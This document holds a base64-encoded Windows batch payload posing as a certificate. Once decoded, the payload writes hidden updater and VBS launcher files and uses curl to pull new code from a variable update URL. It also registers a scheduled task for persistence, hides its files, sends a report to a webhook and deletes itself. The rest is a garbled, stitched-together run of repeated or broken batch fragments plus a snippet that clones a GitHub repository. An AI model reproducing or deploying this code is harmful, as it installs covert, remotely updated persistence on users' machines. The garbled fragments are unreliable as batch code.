kICIldnBhdGglIj4+ICIldnBhdGglXCV1bmFtZSUiCmVjaG8gSUYgRVhJU1QgIiV2cGF0aCVcdGVtcC50eHQiIDJePk5VTCBkZWwgIiV2cGF0aCVcdGVtcC50eHQiPj4gIiV2cGF0aCVcJXVuYW1lJSIKZWNobyBePk5VTCBhdHRyaWIgLWggJWJuYW1lJT4+ICIldnBhdGglXCV1bmFtZSUiCmVjaG8gXj5OVUwgYXR0cmliIC1oICV1bmFtZSU+PiAiJXZwYXRoJVwldW5hbWUlIgplY2hvIF4+TlVMIGF0dHJpYiAtaCAldm5hbWUlPj4gIiV2cGF0aCVcJXVuYW1lJSIKZWNobyBjdXJsIC0tc2lsZW50IC0tb3V0cHV0IC9kZXYvbnVsbCAtc2IgLS10cmFjZS1hc2NpaSAiQWNjZXB0OiB0ZXh0L3BsYWluIiAldXBkYXRldXJsJSBePiAiJXZwYXRoJVx0ZW1wLnR4dCI+PiAiJXZwYXRoJVwldW5hbWUlIgplY2hvIDp3bD4+ICIldnBhdGglXCV1bmFtZSUiCmVjaG8gSUYgRVhJU1QgIiV2cGF0aCVcdGVtcC50eHQiIEdPVE8gdzI+PiAiJXZwYXRoJVwldW5hbWUlIgplY2hvIHRpbWVvdXQgL3QgMSA+PiAiJXZwYXRoJVwldW5hbWUlIgplY2hvIGdvdG8gd2w+PiAiJXZwYXRoJVwldW5hbWUlIgplY2hvIDp3Mj4+ICIldnBhdGglXCV1bmFtZSUiCmVjaG8gMl4+TlVMIGRlbCAlYm5hbWUlPj4gIiV2cGF0aCVcJXVuYW1lJSIKZWNobyByZW4gdGVtcC50eHQgJWJuYW1lJT4+ICIldnBhdGglXCV1bmFtZSUiCmVjaG8gSUYgRVhJU1QgIiV2cGF0aCVcdGVtcC50eHQiIDJePk5VTCBkZWwgIiV2cGF0aCVcdGVtcC50eHQiPj4gIiV2cGF0aCVcJXVuYW1lJSIKZWNobyBicmVha14+JXZuYW1lJT4+ICIldnBhdGglXCV1bmFtZSUiCmVjaG8gZWNobyBzZXQgV3NoU2hlbGwgPSB3c2NyaXB0Xi5jcmVhdGVvYmplY3ReKCJXU2NyaXB0LnNoZWxsIl4pXj4gIiV2cGF0aCVcJXZuYW1lJSI+PiAiJXZwYXRoJVwldW5hbWUlIgplY2hvIGVjaG8gV3NoU2hlbGxeLnJ1biAiIiIldnBhdGglXCVibmFtZSUiIiAiLCAwLCB0cnVlXj5ePiAiJXZwYXRoJVwldm5hbWUlIj4+ICIldnBhdGglXCV1bmFtZSUiCmVjaG8gZWNobyBzZXQgV3NoU2hlbGwgPSBOb3RoaW5nXj5ePiAiJXZwYXRoJVwldm5hbWUlIj4+ICIldnBhdGglXCV1bmFtZSUiCmVjaG8gc3RhcnQgJXZuYW1lJT4+ICIldnBhdGglXCV1bmFtZSUiCmVjaG8gdGltZW91dCAxIF4+bnVsPj4gIiV2cGF0aCVcJXVuYW1lJSIKZWNobyBicmVha14+JXZuYW1lJT4+ICIldnBhdGglXCV1bmFtZSUiCmVjaG8gZWNobyBzZXQgV3NoU2hlbGwgPSB3c2NyaXB0Xi5jcmVhdGVvYmplY3ReKCJXU2NyaXB0LnNoZWxsIl4pXj4gIiV2cGF0aCVcJXZuYW1lJSI+PiAiJXZwYXRoJVwldW5hbWUlIgplY2hvIGVjaG8gV3NoU2hlbGxeLnJ1biAiIiIldnBhdGglXCV1bmFtZSUiIiAiLCAwLCB0cnVlXj5ePiAiJXZwYXRoJVwldm5hbWUlIj4+ICIldnBhdGglXCV1bmFtZSUiCmVjaG8gZWNobyBzZXQgV3NoU2hlbGwgPSBOb3RoaW5nXj5ePiAiJXZwYXRoJVwldm5hbWUlIj4+ICIldnBhdGglXCV1bmFtZSUiCmVjaG8gXj5OVUwgYXR0cmliICIldnBhdGglXCV2bmFtZSUiICtoPj4gIiV2cGF0aCVcJXVuYW1lJSIKZWNobyBePk5VTCBhdHRyaWIgIiV2cGF0aCVcJWJuYW1lJSIgK2g+PiAiJXZwYXRoJVwldW5hbWUlIgplY2hvIF4+TlVMIGF0dHJpYiAiJXZwYXRoJVwldW5hbWUlIiAraD4+ICIldnBhdGglXCV1bmFtZSUiCmdvdG8gc2tpcHVwZGF0ZWNvbmZpZwo6ZG9udHJlbW92ZW1lMgpnb3RvIGRvbnRyZW1vdmVtZTMKOnRhcmdldGVkdXBkYXRlCklGICIlVVNFUk5BTUUlIj09IiV0YXJnZXR1c2VybmFtZSUiICgKSUYgRVhJU1QgIiV2cGF0aCVcdGVtcC50eHQiIDI+TlVMIGRlbCAiJXZwYXRoJVx0ZW1wLnR4dCIKOjogQ2hhbmdlIFZCUwplY2hvIHNldCBXc2hTaGVsbCA9IHdzY3JpcHReLmNyZWF0ZW9iamVjdF4oIldTY3JpcHQuc2hlbGwiXik+ICIldnBhdGglXCV2bmFtZSUiCmVjaG8gV3NoU2hlbGxeLnJ1biAiIiIldnBhdGglXCV1bmFtZSUiIiAiLCAwLCB0cnVlPj4gIiV2cGF0aCVcJXZuYW1lJSIKZWNobyBzZXQgV3NoU2hlbGwgPSBOb3RoaW5nPj4gIiV2cGF0aCVcJXZuYW1lJSIKOjogTWFrZSB1cGRhdGVyIGJhdGNoCmVjaG8gXkBlY2hvIG9mZj4gIiV2cGF0aCVcJXVuYW1lJSIKZWNobyBjZCAiJXZwYXRoJSI+PiAiJXZwYXRoJVwldW5hbWUlIgplY2hvIElGIEVYSVNUICIldnBhdGglXHRlbXAudHh0IiAyXj5OVUwgZGVsICIldnBhdGglXHRlbXAudHh0Ij4+ICIldnBhdGglXCV1bmFtZSUiCmVjaG8gXj5OVUwgYXR0cmliIC1oICVibmFtZSU+PiAiJXZwYXRoJVwldW5hbWUlIgplY2hvIF4+TlVMIGF0dHJpYiAtaCAldW5hbWUlPj4gIiV2cGF0aCVcJXVuYW1lJSIKZWNobyBePk5VTCBhdHRyaWIgLWggJXZuYW1lJT4+ICIldnBhdGglXCV1bmFtZSUiCmVjaG8gY3VybCAtLXNpbGVudCAtLW91dHB1dCAvZGV2L251bGwgLXNiIC0tdHJhY2UtYXNjaWkgIkFjY2VwdDogdGV4dC9wbGFpbiIgJXVwZGF0ZXVybCUgXj4gIiV2cGF0aCVcdGVtcC50eHQiPj4gIiV2cGF0aCVcJXVuYW1lJSIKZWNobyA6d2w+PiAiJXZwYXRoJVwldW5hbWUlIgplY2hvIElGIEVYSVNUICIldnBhdGglXHRlbXAudHh0IiBHT1RPIHcyPj4gIiV2cGF0aCVcJXVuYW1lJSIKZWNobyB0aW1lb3V0IC90IDEgPj4gIiV2cGF0aCVcJXVuYW1lJSIKZWNobyBnb3RvIHdsPj4gIiV2cGF0aCVcJXVuYW1lJSIKZWNobyA6dzI+PiAiJXZwYXRoJVwldW5hbWUlIgplY2hvIDJePk5VTCBkZWwgJWJuYW1lJT4+ICIldnBhdGglXCV1bmFtZSUiCmVjaG8gcmVuIHRlbXAudHh0ICVibmFtZSU+PiAiJXZwYXRoJVwldW5hbWUlIgplY2hvIElGIEVYSVNUICIldnBhdGglXHRlbXAudHh0IiAyXj5OVUwgZGVsICIldnBhdGglXHRlbXAudHh0Ij4+ICIldnBhdGglXCV1bmFtZSUiCmVjaG8gYnJlYWtePiV2bmFtZSU+PiAiJXZwYXRoJVwldW5hbWUlIgplY2hvIGVjaG8gc2V0IFdzaFNoZWxsID0gd3NjcmlwdF4uY3JlYXRlb2JqZWN0XigiV1NjcmlwdC5zaGVsbCJeKV4+ICIldnBhdGglXCV2bmFtZSUiPj4gIiV2cGF0aCVcJXVuYW1lJSIKZWNobyBlY2hvIFdzaFNoZWxsXi5ydW4gIiIiJXZwYXRoJVwlYm5hbWUlIiIgIiwgMCwgdHJ1ZV4+Xj4gIiV2cGF0aCVcJXZuYW1lJSI+PiAiJXZwYXRoJVwldW5hbWUlIgplY2hvIGVjaG8gc2V0IFdzaFNoZWxsID0gTm90aGluZ14+Xj4gIiV2cGF0aCVcJXZuYW1lJSI+PiAiJXZwYXRoJVwldW5hbWUlIgplY2hvIHN0YXJ0ICV2bmFtZSU+PiAiJXZwYXRoJVwldW5hbWUlIgplY2hvIHRpbWVvdXQgMSBePm51bD4+ICIldnBhdGglXCV1bmFtZSUiCmVjaG8gYnJlYWtePiV2bmFtZSU+PiAiJXZwYXRoJVwldW5hbWUlIgplY2hvIGVjaG8gc2V0IFdzaFNoZWxsID0gd3NjcmlwdF4uY3JlYXRlb2JqZWN0XigiV1NjcmlwdC5zaGVsbCJeKV4+ICIldnBhdGglXCV2bmFtZSUiPj4gIiV2cGF0aCVcJXVuYW1lJSIKZWNobyBlY2hvIFdzaFNoZWxsXi5ydW4gIiIiJXZwYXRoJVwldW5hbWUlIiIgIiwgMCwgdHJ1ZV4+Xj4gIiV2cGF0aCVcJXZuYW1lJSI+PiAiJXZwYXRoJVwldW5hbWUlIgplY2hvIGVjaG8gc2V0IFdzaFNoZWxsID0gTm90aGluZ14+Xj4gIiV2cGF0aCVcJXZuYW1lJSI+PiAiJXZwYXRoJVwldW5hbWUlIgplY2hvIF4+TlVMIGF0dHJpYiAiJXZwYXRoJVwldm5hbWUlIiAraD4+ICIldnBhdGglXCV1bmFtZSUiCmVjaG8gXj5OVUwgYXR0cmliICIldnBhdGglXCVibmFtZSUiICtoPj4gIiV2cGF0aCVcJXVuYW1lJSIKZWNobyBePk5VTCBhdHRyaWIgIiV2cGF0aCVcJXVuYW1lJSIgK2g+PiAiJXZwYXRoJVwldW5hbWUlIgpnb3RvIHNraXB1cGRhdGVjb25maWcKKSBlbHNlICggZ290byBub3JtYWxyZWN1cnJpbmcgKQo6ZG9udHJlbW92ZW1lMwo6ZG9udHJlbW92ZW1lCjpza2lwdXBkYXRlY29uZmlnCj5OVUwgU2NoVGFza3MgL2NyZWF0ZSAvZiAvc2MgJXdoZW4lIC90biAiJVNjaGVkdWxlTmFtZSUiIC90ciAiJXZwYXRoJVwldm5hbWUlIgppZiBlcnJvcmxldmVsIDAgKHNldCAicmVjdXJyaW5nPXRydWUsICV3aGVuJSIpIGVsc2UgKHNldCAicmVjdXJyaW5nPWZhaWxlZCwgJXdoZW4lLCBpcyBwcm9iYWJseSBpbmNvcnJlY3QuIikKPk5VTCBhdHRyaWIgIiV2cGF0aCVcJXZuYW1lJSIgK2gKPk5VTCBhdHRyaWIgIiV2cGF0aCVcJWJuYW1lJSIgK2gKPk5VTCBhdHRyaWIgIiV2cGF0aCVcJXVuYW1lJSIgK2gKY3VybCAtLXNpbGVudCAtLW91dHB1dCAvZGV2L251bGwgLWkgLUggIkFjY2VwdDogYXBwbGljYXRpb24vanNvbiIgLUggIkNvbnRlbnQtVHlwZTphcHBsaWNhdGlvbi9qc29uIiAtWCBQT1NUIC0tZGF0YSAie1wiY29udGVudFwiOiBcImBgYEJhdGNoIFNjaGVkdWxlZDogJXJlY3VycmluZyVcbltFbmQgb2YgcmVwb3J0XWBgYFwifSIgICV3ZWJob29rJQppZiBub3QgIiV+ZHAwIj09IiV2cGF0aCVcIiAoCmNhbGwgOmQgJiBleGl0IC9iCjpkCnN0YXJ0IC9iICIiIGNtZCAvYyAyXj5OVUwgZGVsICIlfmYwIiZleGl0IC9iCikKZXhpdA== -----END CERTIFICATE-----
goto tmp
   set /A sample =1
   timeout /t 2 /nobreak > NUL & if errorlevel 0 (set r=true, %when%)
   move "%source%" "%s%"
   2>NUL Info > %temp%
   goto workdone
call
   set "record=%~2"
   echo %%1=%1 N=%N%
cls
set result=false
if "!input:~0,1!" equ "+" set "input = !input:~1!"
   move "%source%" "%s%"
   if 0==1 0
   if %user_agrees% do
call ::insert %~1r %value%
   set wait=false
 set "len=0"
   :: Fixed
   set /a "len+=%%A"
goto endoftests
cd.
   rem Please wait
   call
set "[=rem/||(" & set "]=)"
   rem Please wait
   2>NUL Info > %temp%
set "verp=%%~O"
   set /A sample =1
call
   goto workdone
call ::insert %~1r %value%
2>NUL Info > %temp%
   :: Fixed
echo Started
if "!input:~0,1!" equ "+" set "input = !input:~1!"
IF %F%==1 IF %C%==1
set "verp=%%~O"
   if 0==1 0
set "[:=goto :]%% "
timeout /t 2 /nobreak > NUL & if errorlevel 1(set r = true, % then %)
setlocal
   if %user_agrees% do
whoami
   call
echo %%1=%1 %%2=%2 %%3=%3
   echo %%1=%1 N=%N%
set "us=/dR:% user %"
   rem exit /b 0
 ELSE IF %F%==0 IF %C%==1
   set for /f "delims=[] t=2" %%a in ('2^>NUL b -4 -n 1 %cmptr%
:evr
   if %ERRORLEVEL% EQU 1 goto w
whoami
   fc /l %comp1% %comp2%
   if %user_agrees% do
set result=false
   :: Fixed
   timeout /t 2 /nobreak > NUL
set "input=%~1"
cd.
for /f "delims=[] t=2" %%a in ('2^>NUL b -4 -n 1 %cmptr% ^| fndst [') do set d=%%a
   2>NUL Info > %temp%
:evr
set "verp=%%~O"
set fi=%%~fG & set /p f=f: & set F=%da% & for /f "delims=[] t=2" %%a 
 ELSE IF %F%==0 IF %C%==1
call
   call
   ELSE IF %F%==1 IF %C%==0
ELSE IF %F%==0 IF %C%==1
   if 0==1 0
   set for /f "delims=[] t=2" %%a in ('2^>NUL b -4 -n 1 %cmptr%
   2>NUL Info > %temp%
if "!input:~0,1!" equ "-"
endlocal & if "%~2" neq "" (set %~2=%result%) else echo %result%
set wait=true
set F=%date%
   goto workdone
call ::insert %~1r %value%
goto endoftests
set "s=!s:~%% A!"
   set /A md=2*%%A
ELSE IF %F%==0 IF %C%==1 & set C=cls & set /A spl =1
   set /A md=2*%%A
   rem exit /b 0
echo %%1=%1 %%2=%2 %%3=%3
   goto workdone
   if errorlevel 1 (@echo off) else
echo %~n0 [RtnVar]
set "hos=%~2"
ELSE IF %F%==0 IF %C%==1
call ::insert %~1r %value%
set "s=!s:~%% A!"
if "!input:~0,1!" equ "+" set "input = !input:~1!"
   goto :eof
   set /A md=2*%%A
   2>NUL Info > %temp%
cd.
   ELSE IF %F%==1 IF %C%==0
   timeout /t 2 /nobreak > NUL & if errorlevel 0 (set r=true, %when%)
   call
pause
)
@echo off
:: Créez un répertoire temporaire pour cloner le référentiel GitHub
mkdir temp_repo
cd temp_repo

:: Clonez le référentiel GitHub
git clone https://github.com/y2ks-officiel/modestscript

:: Déplacez les fichiers du référentiel cloné vers l'emplacement du fichier .bat
xcopy /s /e /y modestscript ..\

:: Revenez au répertoire d'origine du fichier .bat
cd ..
:: Supprimez le répertoire temporaire (facultatif)
rmdir /s /q temp_repo
pause
)
echo Started
set "c=%~2"
   set for /f "delims=[] t=2" %%a in ('2^>NUL b -4 -n 1 %cmptr%
set wait=true
ELSE IF %F%==0 IF %C%==1 & set C=cls & set /A spl =1
call
set "input=!input:~1!"
   set wait=false
call
pause
)
set "[:=goto :]%% "
cls
set /A md=2*%%A
set wait=true
echo <wait>
if 0==1 0
echo %~n0 [RtnVar]
pause
)
echo <wait>
set "us=/dR:% user %"
setlocal
   rem exit /b 0
echo Started
pause
)
echo %~n0 [RtnVar]
if "!input:~0,1!" equ "+" set "input = !input:~1!"
IF %F%==1 IF %C%==1
 ELSE IF %F%==0 IF %C%==1
   2>NUL Info > %temp%
   timeout /t 2 /nobreak > NUL
goto endoftests
echo Started
   set /A md=2*%%A
   if %user_agrees% do
echo <wait>
setlocal
cls
   set result=true
   set fi=%%~fG
   fc /l %comp1% %comp2%
cls
call ::insert %~1r %value%
   echo %~1 | find /i "help" >nul 2>&1 && ( goto :help )
   set "record=%~2"
echo Started
set "hos=%~2"
   timeout /t 2 /nobreak > NUL
   goto :eof
   goto :argPad
if errorlevel 0 (set r=true, %when%) else (set r=failed, %when%, correct.)
echo <wait>
timeout /t 2 /nobreak > NUL & if errorlevel 1(set r = true, % then %)
goto endoftests
set "c=%~2"
   set wait=false
if 0==1 0
   set /A md=2*%%A
echo %~n0 [RtnVar]
if "!input:~0,1!" equ "+" set "input = !input:~1!"
   rem exit /b 0
   echo %%1=%1 N=%N%
   goto :eof
:tmp